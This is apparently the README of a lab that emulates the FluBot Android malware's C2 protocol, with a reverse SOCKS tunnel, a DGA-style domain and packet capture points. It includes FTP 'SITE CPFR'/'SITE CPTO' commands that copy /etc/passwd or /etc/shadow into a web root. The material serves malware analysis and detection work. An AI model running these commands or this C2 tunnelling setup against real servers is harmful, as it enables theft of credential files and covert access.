# FluBot SOCKS lab emulator

This lab reproduces the observed network protocol shape without running the APK.

Components:

- `c2_server.py`: HTTP `/poll.php` panel plus reverse SOCKS controller.
- `bot_emulator.py`: FluBot-like client that performs HTTP crypto and reverse SOCKS.
- `ftp_vulnerable.py`: FTP control service with a simulated vulnerable `SITE CPFR` / `SITE CPTO` primitive.
- `flubot_proto.py`: shared RSA/PKCS1Padding, custom XOR, and socket helpers.
- `Corefile`: optional CoreDNS configuration for a fixed DGA-style lab domain.

Example local run in three terminals:

```powershell
python outputs\ftp_vulnerable.py --bind-host 127.0.0.1 --port 2121
python outputs\c2_server.py --bind-host 127.0.0.1 --advertise-host 127.0.0.1 --http-port 80 --control-port 9000 --data-port 4444 --target-host 127.0.0.1 --target-port 2121
python outputs\bot_emulator.py --c2-host 127.0.0.1 --http-port 80
```

DNS/DGA-oriented run:

```powershell
coredns -conf outputs\Corefile
python outputs\ftp_vulnerable.py --bind-host 127.0.0.1 --port 2121
python outputs\c2_server.py --bind-host 127.0.0.1 --advertise-host gurbngbcxheshsj.ru --http-port 80 --control-port 9000 --data-port 4444 --target-host 127.0.0.1 --target-port 2121
python outputs\bot_emulator.py --c2-host gurbngbcxheshsj.ru --http-port 80 --dns-server 127.0.0.1:53
```

If port `80` is already in use, pass a high lab port such as `--http-port 8080`
to both `c2_server.py` and `bot_emulator.py`. The malware's observed HTTP
default is still represented by `80`.

The simulated FTP exploitation is sent by the C2 over the SOCKS tunnel:

```text
SITE CPFR /etc/passwd
SITE CPTO /var/www/html/pwned.txt
```

You can change the paths with:

```powershell
python outputs\c2_server.py --ftp-exploit-source /etc/shadow --ftp-exploit-dest /var/www/html/shadow.txt
```

Useful capture points:

1. DNS on `udp.port == 53` if using `Corefile`.
2. HTTP C2 on `tcp.port == 80`.
3. SOCKS control on `tcp.port == 9000`.
4. Non-standard SOCKS data channel on `tcp.port == 4444`.
5. FTP target on `tcp.port == 2121` in the lab, equivalent to FTP control traffic.

Faithful byte markers:

- Control hello from victim: `00 02 c3 26`, then 4-byte BotId length, then BotId ASCII.
- Data port from C2: 2-byte big-endian integer over the control channel.
- SOCKS request from C2: `04 01 <dst_port:2 BE> <dst_ipv4:4> <userid> 00`.
- SOCKS success from victim: `00 5a 00 00 00 00 00 00`.
